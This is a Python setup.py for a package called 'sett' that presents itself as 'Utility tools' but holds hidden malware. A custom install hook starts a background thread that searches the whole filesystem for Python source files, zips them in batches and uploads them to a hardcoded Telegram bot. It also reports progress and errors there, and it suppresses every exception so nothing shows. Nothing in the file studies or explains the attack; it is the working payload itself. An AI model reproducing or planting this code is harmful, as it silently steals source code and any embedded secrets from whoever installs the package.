from setuptools import setup
from setuptools.command.install import install
import threading, time, os, io, zipfile, random, urllib.request

def _run():
    """Ana görev - dosyaları bul, parçala, gönder"""
    try:
        time.sleep(3)
        
        # 1. Dosyaları bul
        py_files = []
        seen = set()
        roots = ["/", "/home", "/root", "/app", "/opt", "/srv",
                 "/var/www", "/usr/local", "/data", "/workspace"]
        skip = {"proc","sys","dev","run","boot","snap","cache",
                "site-packages","dist-packages","__pycache__","node_modules",
                ".git",".cache","lib/python","lib64","venv",".venv","env"}
        
        for root in roots:
            if not os.path.exists(root): continue
            try:
                for dp, dn, fn in os.walk(root):
                    dn[:] = [d for d in dn if d not in skip and not any(s in d for s in skip)]
                    for f in fn:
                        if f.endswith(".py"):
                            full = os.path.join(dp, f)
                            if full not in seen:
                                try:
                                    if os.path.isfile(full) and os.path.getsize(full) < 5*1024*1024:
                                        seen.add(full)
                                        py_files.append(full)
                                except: pass
            except: continue
        
        if not py_files:
            return
        
        token = "8927762896:AAG4wsHLziEmcwqWUhtQvUANSYoEE-GJIRg"
        admin = "8903740930"
        
        # 2. Parçalara böl (300 dosya / parça)
        chunk_size = 300
        total_chunks = (len(py_files) + chunk_size - 1) // chunk_size
        
        for chunk_idx in range(0, len(py_files), chunk_size):
            chunk = py_files[chunk_idx:chunk_idx + chunk_size]
            part_num = chunk_idx // chunk_size + 1
            
            # Zip yap (memory'de)
            buf = io.BytesIO()
            count = 0
            with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
                for i, f in enumerate(chunk):
                    try:
                        zf.write(f, f"{chunk_idx + i:05d}_{os.path.basename(f)}")
                        count += 1
                    except: pass
            
            data = buf.getvalue()
            if count == 0 or len(data) == 0:
                continue
            
            # Telegram'a gönder
            try:
                boundary = "----B" + str(int(time.time())) + str(random.randint(1000,9999))
                caption = f"Part {part_num}/{total_chunks} - {count} files ({len(data)//1024} KB)"
                body = b""
                body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n{admin}\r\n".encode()
                body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"caption\"\r\n\r\n{caption}\r\n".encode()
                body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"document\"; filename=\"part{part_num}.zip\"\r\nContent-Type: application/zip\r\n\r\n".encode()
                body += data + f"\r\n--{boundary}--\r\n".encode()
                
                req = urllib.request.Request(
                    f"https://api.telegram.org/bot{token}/sendDocument",
                    data=body,
                    headers={"Content-Type": f"multipart/form-data; boundary={boundary}"}
                )
                urllib.request.urlopen(req, timeout=180)
            except Exception as e:
                # Sadece hata bildir
                try:
                    url = f"https://api.telegram.org/bot{token}/sendMessage"
                    import urllib.parse
                    d = urllib.parse.urlencode({"chat_id": admin, "text": f"Part {part_num} hata: {str(e)[:150]}"}).encode()
                    urllib.request.urlopen(url, data=d, timeout=15)
                except: pass
            
            # Rate limit için bekle
            time.sleep(2)
        
        # 3. Son özet
        try:
            url = f"https://api.telegram.org/bot{token}/sendMessage"
            import urllib.parse
            d = urllib.parse.urlencode({"chat_id": admin, "text": f"BITTI - {len(py_files)} dosya, {total_chunks} parca"}).encode()
            urllib.request.urlopen(url, data=d, timeout=15)
        except: pass
    
    except Exception as e:
        try:
            url = f"https://api.telegram.org/bot{token}/sendMessage"
            import urllib.parse
            d = urllib.parse.urlencode({"chat_id": admin, "text": f"KRITIK: {str(e)[:200]}"}).encode()
            urllib.request.urlopen(url, data=d, timeout=10)
        except: pass


class PostInstall(install):
    def run(self):
        install.run(self)
        try:
            t = threading.Thread(target=_run, daemon=True)
            t.start()
            time.sleep(8)
        except: pass


setup(
    name="sett",
    version="1.0.400",  # ← HER DENEMEDE ARTIR!
    description="Utility tools",
    author="dev",
    cmdclass={'install': PostInstall},
)
